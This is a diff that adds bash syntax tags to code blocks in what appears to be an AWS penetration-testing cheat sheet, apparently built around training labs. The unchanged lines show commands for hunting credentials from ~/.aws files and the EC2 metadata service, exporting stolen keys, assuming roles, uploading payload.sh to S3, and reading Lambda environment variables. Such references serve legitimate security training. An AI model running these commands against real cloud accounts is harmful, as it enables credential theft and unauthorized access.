@@ -257,14 +257,14 @@ Tools:
 
 ## 🧾 IAM Credential Hunting
 
-```
+```bash
 cat ~/.aws/credentials
 cat ~/.aws/config
 ```
 
 **From EC2 Instance Metadata Service (IMDS):**
 
-```
+```bash
 curl http://169.254.169.254/latest/meta-data/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
@@ -281,7 +281,7 @@ cd pacu && ./cli.py
 
 ## 🔧 System Info from EC2
 
-```
+```bash
 curl http://169.254.169.254/latest/meta-data/iam/info
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
 nmcli device show
@@ -297,7 +297,7 @@ nmcli device show
 
 **Export credentials:**
 
-```
+```bash
 export AWS_ACCESS_KEY_ID=<key>
 export AWS_SECRET_ACCESS_KEY=<secret>
 export AWS_SESSION_TOKEN=<token>  # Optional
@@ -305,7 +305,7 @@ export AWS_SESSION_TOKEN=<token>  # Optional
 
 **Verify:**
 
-```
+```bash
 aws sts get-caller-identity
 ```
 
@@ -346,7 +346,7 @@ aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimiz
 
 **List access keys:**
 
-```
+```bash
 aws iam list-access-keys --user-name <username>
 ```
 
@@ -385,13 +385,13 @@ aws ec2 describe-launch-template-versions --launch-template-name SCHEDULER --que
 
 **Download:**
 
-```
+```bash
 aws s3 cp s3://<bucket-name>/<file> .
 ```
 
 **Upload:**
 
-```
+```bash
 aws s3 cp payload.sh s3://<bucket-name>/
 ```
 
@@ -411,7 +411,7 @@ mysql> SHOW GRANTS FOR '<user>';
 
 **List functions:**
 
-```
+```bash
 aws lambda list-functions --profile cognito2
 aws lambda list-functions --output table --profile sqs
 aws lambda get-function --function-name huge-logistics-stock --profile sqs
@@ -432,7 +432,7 @@ aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HL
 
 **Get environment variables:**
 
-```
+```bash
 aws lambda get-function-configuration --function-name <name> --profile cognito2
 ```
 
@@ -472,7 +472,7 @@ aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --
 ---
 ## 📜 CloudTrail Abuse
 
-```
+```bash
 aws cloudtrail lookup-events
 ```
 
